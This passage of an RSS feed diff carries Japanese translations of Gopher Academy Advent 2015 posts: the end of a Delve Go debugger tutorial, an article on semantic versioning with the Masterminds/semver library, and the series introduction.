+&lt;p&gt;&lt;code&gt;continue&lt;/code&gt;コマンドを使うとブレークポイントの位置まで続行できる。ブレークポイントで停止したら、&lt;code&gt;next&lt;/code&gt;と入力してエンターキーを押すことでプログラムを調査できる(delveは空行を入力されると最後に実行したコマンドを繰り返す)。&lt;code&gt;next&lt;/code&gt;コマンドはソースコードを1行ずつ進めていく。&lt;code&gt;print&lt;/code&gt;コマンドを使って&lt;code&gt;workers&lt;/code&gt;の値を見てみよう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;(dlv) print workers
+10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;delveは以下のような式の評価もできる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;(dlv) print workers &amp;lt; 100
+true
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;dostuff&lt;/code&gt;関数にもブレークポイントをセットしてみよう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;(dlv) break dostuff
+Breakpoint 2 set at 0x205f for main.dostuff ./test.go:9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;再度&lt;code&gt;continue&lt;/code&gt;を使ってブレークポイントまで行ってみよう&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;(dlv) continue
+&amp;gt; main.dostuff() ./test.go:9 (hits goroutine(6):1 total:1)
+
+     4:         &amp;quot;fmt&amp;quot;
+     5:         &amp;quot;sync&amp;quot;
+     6: )
+     7:
+     8: func dostuff(wg *sync.WaitGroup, i int) {
+=&amp;gt;   9:         fmt.Printf(&amp;quot;goroutine id %d\n&amp;quot;, i)
+    10:         fmt.Printf(&amp;quot;goroutine id %d\n&amp;quot;, i)
+    11:         wg.Done()
+    12: }
+    13:
+    14: func main() {
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;(dlv) print i&lt;/code&gt;を使って&lt;code&gt;i&lt;/code&gt;の値を出力してみよう。そして&lt;code&gt;next&lt;/code&gt;コマンドを使って&lt;code&gt;i&lt;/code&gt;の値を再度出力してみよう。同じものであり、それが偶然ではないことが分かるだろう。&lt;/p&gt;
+
+&lt;p&gt;この関数を実行する10個のgoroutineを作ったが同じgoroutineに辿り着く。これはDelveがGo専用のデバッガでGoroutineのようなGo特有の実行環境を理解しているからである。
+&lt;code&gt;next&lt;/code&gt;コマンドを実行するとDelveは同じGoroutineの次のソース行に辿り着くことを保証する。これは他のツールで&lt;code&gt;next&lt;/code&gt;と同等のコマンドを実行した時に別のgoroutineに辿り着いてしまう、イライラする&amp;rsquo;thrashing&amp;rsquo;(訳注:他のGoroutineと行ったり来たりしてしまう現象だと思われる)から解放してくれる。&lt;/p&gt;
+
+&lt;h2 id=&#34;まとめ:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;まとめ&lt;/h2&gt;
+
+&lt;p&gt;この記事で紹介したのはDelveができることの基礎の基礎だけで、表面的に触ってみただけに過ぎない。
+お使いのプログラムにDelveを適用してみて&lt;code&gt;help&lt;/code&gt;コマンドでプログラムの調査に使える全ての方法をチェックしてみて欲しい。&lt;/p&gt;
+
+&lt;p&gt;Delveはまだpre1.0なので既存機能の改善及び新機能の追加を予定していることは覚えておいて欲しい。&lt;/p&gt;
+
+&lt;h2 id=&#34;how-to-contribute:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;How to contribute&lt;/h2&gt;
+
+&lt;p&gt;このプロジェクトはオープンソースなので良かったらチェックアウトしてみて欲しい。バージョン1.0のリリースはまもなくの予定だ。得られるフィードバックとコントリビューションを全て活用したい。
+&lt;a href=&#34;https://github.com/derekparker/delve&#34;&gt;レポジトリ&lt;/a&gt;をチェックアウトして遠慮無くissueを上げたりパッチを送ったりして欲しい。&lt;/p&gt;
+
+&lt;p&gt;もしDelveをHackしてみたいけど何から初めて良いか分からないならコントリビューションの助けとなる助言や資料に関して質問して欲しい。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月2日 - Working with Semantic Versions</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/2-semver-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:17 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/2-semver-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/semver/&#34;&gt;12月2日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://semver.org/&#34;&gt;Semantic Versioning&lt;/a&gt;(SemVer)(日本語は&lt;a href=&#34;http://semver.org/lang/ja/&#34;&gt;こちら&lt;/a&gt;)はバージョン管理する際のポピュラーな方法になってきた。
+インクリメンタルなリリースを可能にするだけでなく人にとっても自動化する場合でも変更の意味が推測できるような構造になっている。
+このおかげでSemVerは幅広い用途で理想的なバージョン管理方法になっている。最も有名なのはパッケージ管理システムである。&lt;/p&gt;
+
+&lt;p&gt;Goでの使い方を見ていく前に、semantic versionがどのようなものかを見てみよう。&lt;/p&gt;
+
+&lt;img src=&#34;http://localhost:1313/images/gopheracademy-advent-2015-ja/semver.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+&lt;p&gt;上記の図はsemantic versionの一例を示している。&lt;code&gt;.&lt;/code&gt;で区切られた最初の3つの数字だけのものをよく見かけるのではないだろうか。semantic versionは一般的には以下のように分けられている。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;メジャーナンバーはパッケージやアプリケーションのAPIが後方互換性を失って変更された場合に増加される。&lt;/li&gt;
+&lt;li&gt;マイナーナンバーは後方互換性を失わずに新たな機能が追加された場合に増加される。メジャーナンバーが増加した場合はマイナーナンバーは0に戻る。&lt;/li&gt;
+&lt;li&gt;パッチナンバーは機能の追加は無いがバグ修正を行った場合に増加される。メジャーナンバーやマイナーナンバーが増加した場合はパッチナンバーは0に戻る。&lt;/li&gt;
+&lt;li&gt;プレリリースは&lt;code&gt;-&lt;/code&gt;の後に続く&lt;code&gt;.&lt;/code&gt;で区切られた識別子である。例えば&lt;code&gt;1.2.3-beta.1&lt;/code&gt;といったようなものである。これは任意のものでありプレリリースバージョンでのみ必要である。今回の場合、&lt;code&gt;1.2.3&lt;/code&gt;が&lt;code&gt;1.2.3-beta.1&lt;/code&gt;というプレリリースに続くリリースバージョンになるだろう。&lt;/li&gt;
+&lt;li&gt;最後のセクションはビルド用のメタデータである。これは&lt;code&gt;+&lt;/code&gt;のあとに続く&lt;code&gt;.&lt;/code&gt;で区切られた識別子である。これはプレリリースとは異なる情報であり、バージョンの優先度を決める場合には無視されるべきものである。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;仕様ではプレフィックスとして&lt;code&gt;v&lt;/code&gt;を使うかの記載は無いが、例えば&lt;code&gt;v1.2.3&lt;/code&gt;というように&lt;code&gt;v&lt;/code&gt;を付けている例を見ることがあるだろう。この&lt;code&gt;v&lt;/code&gt;は無視されるべきものである。&lt;/p&gt;
+
+&lt;p&gt;より詳細な情報は&lt;a href=&#34;http://semver.org/&#34;&gt;公式ページ&lt;/a&gt;を参照。&lt;/p&gt;
+
+&lt;p&gt;semantic versionの性質、パースやソート、範囲や条件を考慮した比較といったものは容易に実現できる。&lt;/p&gt;
+
+&lt;h2 id=&#34;semantic-versionのパース:26cdf9d4774599cdb5a154b911b7e12c&#34;&gt;Semantic Versionのパース&lt;/h2&gt;
+
+&lt;p&gt;semantic versionを扱うためのパッケージは多数存在する。今回は&lt;a href=&#34;https://github.com/Masterminds/semver&#34;&gt;github.com/Masterminds/semver&lt;/a&gt;を利用する。仕様に沿って作られていて&lt;code&gt;v&lt;/code&gt;をプレフィックスとしたものもサポートし、ソートや範囲や条件との比較をテストすることもできる。条件はJavaScriptやRust等を含むその他の言語のライブラリと同様に扱うことができる。&lt;/p&gt;
+
+&lt;p&gt;以下の例はsemantic versionをパースし、パースできない場合はエラーを、問題がなかった場合はメジャーナンバーを表示するものである。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;v, err := semver.NewVersion(&amp;quot;1.2.3-beta.1+build345&amp;quot;)
+if err != nil {
+    fmt.Println(err)
+} else {
+    fmt.Println(v.Major())
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;戻り値は多くの便利なメソッドを持った&lt;code&gt;semver.version&lt;/code&gt;のインスタンスである。バージョンがsemanticでない場合、&lt;code&gt;semver.ErrInvalidSemVer&lt;/code&gt;エラーを返す。&lt;/p&gt;
+
+&lt;p&gt;個々のバージョンのパースだけでなくより複雑な操作を行えるところに真価がある。&lt;/p&gt;
+
+&lt;h2 id=&#34;semantic-versionのソート:26cdf9d4774599cdb5a154b911b7e12c&#34;&gt;Semantic Versionのソート&lt;/h2&gt;
+
+&lt;p&gt;いくつかのバージョンがあったとき、それらは順番になっていないかもしれない。標準ライブラリの&lt;code&gt;sort&lt;/code&gt;パッケージを使ってソートできたら素晴らしいのではないだろうか。&lt;a href=&#34;https://github.com/Masterminds/semver&#34;&gt;github.com/Masterminds/semver&lt;/a&gt;ではこれができる。以下に例を示す。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;raw := []string{&amp;quot;1.2.3&amp;quot;, &amp;quot;1.0&amp;quot;, &amp;quot;1.0.0-alpha.1&amp;quot; &amp;quot;1.3&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;0.4.2&amp;quot;,}
+vs := make([]*semver.Version, len(raw))
+for i, r := range raw {
+    v, err := semver.NewVersion(r)
+    if err != nil {
+        t.Errorf(&amp;quot;Error parsing version: %s&amp;quot;, err)
+    }
+
+    vs[i] = v
+}
+
+sort.Sort(semver.Collection(vs))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;この例では一連のsemantic versionが&lt;code&gt;semver.Version&lt;/code&gt;のインスタンスに変換され&lt;code&gt;semver.Collection&lt;/code&gt;になっている。&lt;code&gt;semver.Collection&lt;/code&gt;はコレクションを並び替えるために&lt;code&gt;sort&lt;/code&gt;パッケージが必要とするメソッドを持つものである。これはプレリリース情報をソート、メタデータを無視、そしてその他ソートの要素を扱うスマートな方法である。&lt;/p&gt;
+
+&lt;h2 id=&#34;範囲-条件-ワイルドカード:26cdf9d4774599cdb5a154b911b7e12c&#34;&gt;範囲、条件、ワイルドカード&lt;/h2&gt;
+
+&lt;p&gt;バージョンが範囲内にあるか、または条件を満たしているか。これはバージョンを扱う上でよくある問題だ。このチェックも可能だ。例えば以下のようなものだ。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;c, err := semver.NewConstraint(&amp;quot;&amp;gt;= 1.2.3, &amp;lt; 2.0.0, != 1.4.5&amp;quot;)
+if err != nil {
+    fmt.Println(&amp;quot;Error parsing constraint:&amp;quot;, err)
+    return
+}
+
+v, err := semver.NewVersion(&amp;quot;1.3&amp;quot;)
+if err != nil {
+    fmt.Println(&amp;quot;Error parsing version:&amp;quot;, err)
+    return
+}
+
+a := c.Check(v)
+fmt.Println(&amp;quot;Version within constraint:&amp;quot;, a)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;他のツール等でバージョンの範囲を扱ったことがあれば、範囲を扱う一般的なショートカットがあることをご存知だろう。&lt;code&gt;semver&lt;/code&gt;パッケージでもこれらは利用可能である。これらは以下のものを含む。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;^1.2.3&lt;/code&gt;というメジャーバージョンの互換性を保つもの。これは&lt;code&gt;&amp;gt;=1.2.3, &amp;lt; 2.0.0&lt;/code&gt;と等しい。これはAPIのバージョンをサポートする場合に有用である。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~1.2.3&lt;/code&gt;というパッチレベルの変更をサポートするもの。これは&lt;code&gt;&amp;gt;= 1.2.3, &amp;lt; 1.3.0&lt;/code&gt;と等しい。これは追加機能無しでのバグ修正をサポートする。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1.2.3 - 3.4.5&lt;/code&gt;は範囲をサポートするもの。これは&lt;code&gt;&amp;gt;= 1.2.3, &amp;lt;= 3.4.5&lt;/code&gt;と等しい。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;x&lt;/code&gt;や&lt;code&gt;X&lt;/code&gt;、&lt;code&gt;*&lt;/code&gt;といったワイルドカードを利用することもできる。例えば&lt;code&gt;2.x&lt;/code&gt;, &lt;code&gt;1.2.x&lt;/code&gt;や単に&lt;code&gt;*&lt;/code&gt;といったものが使える。これらはその他の比較演算と一緒に使うことも単体で使うこともできる。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;smantic-versionを始めよう:26cdf9d4774599cdb5a154b911b7e12c&#34;&gt;Smantic Versionを始めよう&lt;/h2&gt;
+
+&lt;p&gt;もし何かをバージョン管理するならsemantic versionを使うことをお勧めする。Goのツールであれば今回紹介した&lt;a href=&#34;https://github.com/Masterminds/semver&#34;&gt;github.com/Masterminds/semver&lt;/a&gt;のようなものを使えば簡単にsemantic versionを扱うことができる。もしまだsemantic versionを採用していないなら今が始めるときである。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月1日 - December Blog Series Introduction</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/1-introduction-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:16 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/1-introduction-ja/</guid>
+      <description>&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/introduction/&#34;&gt;12月1日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;またこの季節がやってきた。若いGopherたちがGoプログラミングに関するハイクオリティな記事を夢見る季節が。GopherAcademyでは2年間Advent Calendarを行って来た。そしてそれは我々のコンテンツの中でも最も成功したものであった。それぞれのポストは全世界から何千ものアクセスがあった。&lt;/p&gt;
+
+&lt;p&gt;今年は少しだけ変えようと思う。我々が獲得してきた様々な文化及び国際的な読者層に向けて&amp;rdquo;December Blog Series&amp;rdquo;という名前に変更しようと思う。初心者及び上級者に向けた様々な方からの素晴らしいポストがラインナップされているので楽しみにしていて欲しい。&lt;/p&gt;
+
+&lt;p&gt;昨年はGoコミュニティの素晴らしい方々による25の記事をポストした。Advent CalendarでアナウンスされたDerek Parkerの&lt;a href=&#34;https://blog.gopheracademy.com/advent-2014/delve/&#34;&gt;Delve&lt;/a&gt;はMicrosoftのクロスプラットフォームエディタの一部を担うことになった。今はまだどのような驚きがあるかわからないだろうが今年も大きなものがあるだろう。&lt;/p&gt;
+
+&lt;p&gt;去年のリンクは&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2014/&#34;&gt;ここ&lt;/a&gt;に、2013年のリンクは&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2013/&#34;&gt;ここ&lt;/a&gt;にある。&lt;/p&gt;
+
+&lt;p&gt;読んでくれてありがとう。ポストをシェアするのが待ちきれない。まだいくつか空いているのでGoのコミュニティと共有したいものがあれば&lt;a href=&#34;https://docs.google.com/spreadsheets/d/1H0rj7TJo0t8GWyNdGwEc6bGcDj6UgJUN42JtAtbPMrk/edit#gid=0&amp;amp;vpid=A2&#34;&gt;ここ&lt;/a&gt;から登録して欲しい(訳注:現時点ではもちろん既に埋まっています)。もし母国語が英語でなくても記事の作成をサポートする編集チームがスタンバイしている。&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
